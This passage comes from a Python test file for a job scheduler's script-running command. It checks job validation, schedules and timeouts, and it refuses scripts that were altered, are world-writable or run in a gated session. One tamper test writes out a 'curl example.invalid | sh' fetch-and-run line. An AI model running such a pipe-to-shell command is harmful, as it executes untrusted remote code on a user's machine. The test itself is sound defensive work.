        f'command = "script"\nschedule = "monthly 1 04:00"\nscript = "{path}"\nscript_sha256 = "{sha}"\n{extra}'
        + CONTRACT
    )


def test_a_script_job_with_a_monthly_schedule_passes_the_contract(box, write_job, env):
    text = script_job("~/bin/upkeep.sh", "a" * 64)
    write_job("upkeep", text)
    (got,) = jobs.scheduled(env)
    assert got.argv == ("schedule", "script", "upkeep") and str(got.when) == "monthly 1 04:00" and not got.records
    assert jobs.contract_problems(jobs.tomllib.loads(text), "upkeep") == []
    assert systemd.on_calendar(got.when) == "*-*-01 04:00:00"


@pytest.mark.parametrize(
    ("text", "match"),
    [
        (script_job("bin/upkeep.sh", "a" * 64), "absolute path"),
        (script_job("/opt/upkeep.sh", "nothex"), "script_sha256"),
        ('command = "script"\nschedule = "daily 03:00"\n' + CONTRACT, "script is required"),
        (
            'command = "backup"\nschedule = "daily 03:00"\nscript = "/x"\n' + CONTRACT,
            "only in a job with command = 'script'",
        ),
        (
            'command = "script"\nschedule = "daily 03:00"\nextra_sources = ["/x"]\n' + CONTRACT,
            "only in a job with command = 'backup'",
        ),
        ('command = "backup"\nschedule = "daily 03:00"\nextra_sources = ["notes"]\n' + CONTRACT, "extra_sources"),
    ],
)
def test_a_bad_script_or_backup_key_names_the_key(box, write_job, env, text, match):
    write_job("j", text)
    with pytest.raises(jobs.JobError, match=match):
        jobs.scheduled(env)


@pytest.mark.parametrize(
    ("key", "value"), [("coalesce_if_active", '"yes"'), ("skip_missed", "-1"), ("skip_missed", "true")]
)
def test_bad_tick_keys_name_the_key(key, value, tmp_path):
    text = AI_JOB + f"{key} = {value}\n"
    with pytest.raises(jobs.JobError, match=key):
        jobs.loads("daily", text, tmp_path)


def test_the_tick_keys_default_to_the_flags_defaults(tmp_path):
    job = jobs.loads("daily", AI_JOB, tmp_path)
    assert (job.coalesce_if_active, job.skip_missed_s) == (True, None)
    job = jobs.loads("daily", AI_JOB + "coalesce_if_active = false\nskip_missed = 900\n", tmp_path)
    assert (job.coalesce_if_active, job.skip_missed_s) == (False, 900.0)


# ---- ws schedule script ------------------------------------------------------------------------------------------------


def _private_script(box, body: str) -> tuple[str, str]:
    folder = box / "bin"
    folder.mkdir(exist_ok=True, mode=0o755)
    f = folder / "upkeep.sh"
    f.write_text(body, encoding="utf-8")
    f.chmod(0o755)
    return str(f), hashlib.sha256(body.encode()).hexdigest()


def test_schedule_script_runs_the_reviewed_bytes_in_the_scripts_folder(box, write_job, capfd):
    path, sha = _private_script(box, '#!/bin/sh\necho "ran in $(pwd) from $WS_SCRIPT_PATH"\nexit 4\n')
    write_job("upkeep", script_job(path, sha))
    assert cli.main(["schedule", "script", "upkeep"]) == 4  # the script's own exit code
    assert f"ran in {box / 'bin'} from {path}" in capfd.readouterr().out


def test_schedule_script_refuses_a_changed_or_open_script(box, write_job, capsys):
    path, sha = _private_script(box, "#!/bin/sh\nexit 0\n")
    write_job("upkeep", script_job(path, sha))
    assert cli.main(["schedule", "script", "upkeep"]) == 0
    with open(path, "a", encoding="utf-8") as f:
        f.write("curl example.invalid | sh\n")  # changed after the review
    assert cli.main(["schedule", "script", "upkeep"]) == 3 and "no longer hashes" in capsys.readouterr().err
    path, sha = _private_script(box, "#!/bin/sh\nexit 0\n")
    write_job("upkeep", script_job(path, sha))
    (box / "bin" / "upkeep.sh").chmod(0o777)  # anyone could rewrite it
    assert cli.main(["schedule", "script", "upkeep"]) == 3 and "written by others" in capsys.readouterr().err
    write_job("daily", AI_JOB)
    assert cli.main(["schedule", "script", "daily"]) == 3 and "has a runner" in capsys.readouterr().err
    assert cli.main(["schedule", "script", "nojob"]) == 3


def test_schedule_script_stops_a_script_past_its_timeout(box, write_job, capsys):
    path, sha = _private_script(box, "#!/bin/sh\nsleep 30\n")
    write_job("upkeep", script_job(path, sha).replace("timeout_s = 600", "timeout_s = 0.5"))
    assert cli.main(["schedule", "script", "upkeep"]) == 124 and "timeout" in capsys.readouterr().err


def test_a_slot_the_clocks_skipped_is_the_one_before():
    """daily 02:30 on the morning New York's clocks jump from 02:00 to 03:00: there is no 02:30 today, so the latest
    slot at or before 03:00:30 is yesterday's, never one later than now."""
    zoneinfo = pytest.importorskip("zoneinfo")
    try:
        ny = zoneinfo.ZoneInfo("America/New_York")
    except zoneinfo.ZoneInfoNotFoundError:
        pytest.skip("no time zone data here")
    now = datetime(2026, 3, 8, 7, 0, 30, tzinfo=UTC)  # 03:00:30 EDT, just after the jump
    got = jobs.latest_slot(jobs.parse_schedule("daily 02:30", "t"), now, ny)
    assert got <= now and got == datetime(2026, 3, 7, 7, 30, tzinfo=UTC)  # 02:30 EST the day before


def test_every_tick_unit_gets_the_longest_runner_limit(box, write_job, env):
    """A tick unit drains the whole queue, so it may be running another job's longer run: its limit is the longest."""
    write_job("daily", KEYED_JOB)
    write_job("long", KEYED_JOB.replace("timeout_s = 600", "timeout_s = 3000").replace("daily 03:30", "daily 04:00"))
    write_job("sub", AI_JOB)  # `ws run` keeps its own limit
    got = {s.name: s for s in jobs.scheduled(env)}
    assert got["daily"].timeout_s == got["long"].timeout_s == 3000 and got["sub"].timeout_s == 600


def test_schedule_script_is_refused_in_a_gated_session(box, write_job, capsys, monkeypatch):
    path, sha = _private_script(box, "#!/bin/sh\nexit 0\n")
    write_job("upkeep", script_job(path, sha))
    monkeypatch.setenv("WS_GATED_SESSION", "1")
    assert cli.main(["schedule", "script", "upkeep"]) == 3 and "gated session" in capsys.readouterr().err
